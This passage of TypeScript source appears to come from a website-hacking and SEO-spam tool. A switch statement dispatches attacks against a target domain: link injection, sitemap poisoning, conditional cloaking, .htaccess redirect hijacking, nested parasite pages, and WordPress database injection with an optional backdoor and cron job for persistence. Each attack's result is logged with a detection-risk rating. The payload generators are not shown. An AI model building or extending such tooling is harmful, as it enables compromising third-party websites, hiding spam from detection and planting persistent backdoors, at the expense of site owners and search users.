          const result = generateLinkInjection(redirectUrl, allKeywords, {
            linkCount: pageCount,
          });
          payload = result;
          linksInjected = result.totalLinks;
          break;
        }
        case "sitemap_poisoning": {
          const spamUrls = allKeywords.map(kw => `https://${targetDomain}/${slugify(kw)}-${randomStr(3)}/`);
          const result = generateSitemapPoison(targetDomain, spamUrls);
          payload = result;
          pagesCreated = spamUrls.length;
          break;
        }
        case "conditional_cloaking": {
          const spamContent = `<h1>${pickRandom(allKeywords)}</h1><p>${allKeywords.join(", ")}</p><a href="${redirectUrl}">Click here</a>`;
          const result = generateConditionalCloaking(redirectUrl, spamContent);
          payload = result;
          redirectsSetup = 1;
          break;
        }
        case "wp_db_injection": {
          const result = generateWPDbInjection(targetDomain, redirectUrl, allKeywords, {
            postCount: pageCount,
            includeBackdoor: options.enablePersistence,
            includeCronJob: options.enablePersistence,
          });
          payload = result;
          pagesCreated = pageCount;
          linksInjected = allKeywords.length;
          break;
        }
        case "htaccess_hijack": {
          const result = generateHtaccessHijack(redirectUrl);
          payload = result;
          redirectsSetup = 1;
          break;
        }
        case "parasite_nesting": {
          const result = generateParasiteNest(targetDomain, redirectUrl, allKeywords, {
            nestDepth: 3,
            pagesPerDir: 5,
          });
          payload = result;
          pagesCreated = result.totalPages;
          redirectsSetup = result.totalPages;
          break;
        }
      }

      results.push({
        hackType,
        success: true,
        targetDomain,
        payloadsGenerated: 1,
        pagesCreated,
        linksInjected,
        redirectsSetup,
        cloakingEnabled: enableCloaking,
        persistenceEnabled: options.enablePersistence || false,
        detectionRisk: enableCloaking ? "low" : "medium",
        payload,
        elapsed: Date.now() - hackStart,
      });
    } catch (error: any) {
      results.push({
        hackType,
        success: false,
        targetDomain,
        payloadsGenerated: 0,
        pagesCreated: 0,
        linksInjected: 0,
        redirectsSetup: 0,
        cloakingEnabled: false,
        persistenceEnabled: false,
        detectionRisk: "high",
        payload: null,
        elapsed: Date.now() - hackStart,
        error: error.message,
      });
    }
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  EXPORTS: TECHNIQUE INFO
// ═══════════════════════════════════════════════════════

export function getHackTechniques(category?: string): HackTechnique[] {
  if (category) {
    return HACK_TECHNIQUES.filter(t => t.category === category);
  }
  return [...HACK_TECHNIQUES];
}

export function getHackTechniqueById(id: HackType): HackTechnique | undefined {
  return HACK_TECHNIQUES.find(t => t.id === id);
}
